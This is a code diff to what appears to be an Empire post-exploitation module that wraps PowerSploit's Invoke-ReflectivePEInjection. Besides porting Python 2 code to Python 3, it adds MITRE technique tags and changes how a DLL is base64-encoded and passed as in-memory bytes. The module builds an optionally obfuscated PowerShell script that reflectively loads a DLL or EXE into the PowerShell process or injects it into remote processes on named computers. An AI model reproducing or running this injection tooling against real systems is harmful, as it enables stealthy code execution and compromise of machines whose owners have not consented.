@@ -1,7 +1,10 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 from lib.common import helpers
 import base64
 
-class Module:
+class Module(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -13,6 +16,10 @@ class Module:
             'Description': ("Uses PowerSploit's Invoke-ReflectivePEInjection to reflectively load "
                             "a DLL/EXE in to the PowerShell process or reflectively load a DLL in to a "
                             "remote process."),
+
+            'Software': 'S0194',
+
+            'Techniques': ['T1055', 'TA0001'],
 
             'Background' : False,
 
@@ -60,10 +67,10 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'ForceASLR' : {
-                'Description'   :   'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
-                'Required'      :   True,
-                'Value'         :   'False'
+            'ForceASLR': {
+                'Description': 'Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn\'t support ASLR.',
+                'Required': True,
+                'Value': 'False'
             },
             'ComputerName' : {
                 'Description'   :   'Optional an array of computernames to run the script on.',
@@ -86,14 +93,14 @@ class Module:
     def generate(self, obfuscate=False, obfuscationCommand=""):
         
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-ReflectivePEInjection.ps1"
+        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
         if obfuscate:
             helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
             moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
-            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
+            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
             return ""
 
         moduleCode = f.read()
@@ -105,22 +112,27 @@ class Module:
 
         #check if dllpath or PEUrl is set. Both are required params in their respective parameter sets.
         if self.options['DllPath']['Value'] == "" and self.options['PEUrl']['Value'] == "":
-            print helpers.color("[!] Please provide a PEUrl or DllPath")
+            print(helpers.color("[!] Please provide a PEUrl or DllPath"))
             return ""
-        for option,values in self.options.iteritems():
+        for option,values in self.options.items():
             if option.lower() != "agent":
                 if option.lower() == "dllpath":
                     if values['Value'] != "":
-                        try:
+                       try:
                             f = open(values['Value'], 'rb')
                             dllbytes = f.read()
                             f.close()
 
-                            base64bytes = base64.b64encode(dllbytes)
-                            scriptEnd += " -PEbase64 " + str(base64bytes)
+                            base64bytes = base64.b64encode(dllbytes).decode('UTF-8')
 
-                        except:
-                            print helpers.color("[!] Error in reading/encoding dll: " + str(values['Value']))
+                            scriptEnd = "\n$PE =  [Convert]::FromBase64String(\'" + base64bytes + "\')" + scriptEnd
+                            scriptEnd += " -PEBytes $PE"
+
+                       except:
+                            print(helpers.color("[!] Error in reading/encoding dll: " + str(values['Value'])))
+                elif option.lower() == 'forceaslr':
+                    if values['Value'].lower() == "true":
+                        scriptEnd += " -" + str(option)
                 elif values['Value'].lower() == "true":
                     scriptEnd += " -" + str(option)
                 elif values['Value'] and values['Value'] != '':
